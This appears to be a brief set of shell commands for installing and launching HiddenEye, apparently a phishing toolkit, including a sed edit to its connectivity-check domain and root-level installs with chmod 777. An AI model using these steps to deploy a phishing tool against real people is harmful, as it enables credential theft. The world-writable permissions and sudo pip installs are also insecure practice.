$ git clone https://github.com/DarkSecDevelopers/HiddenEye.git
$ chmod 777 HiddenEye
$ sudo apt install python3-pip
$ cd HiddenEye
$ sudo pip3 install -r requirements.txt
$ sudo pip3 install requests
$ sed -i "s/dark-sec-official.com/www.google.com/" Defs/ActionManager/simple_informant.py 
$ sudo python3 HiddenEye.py
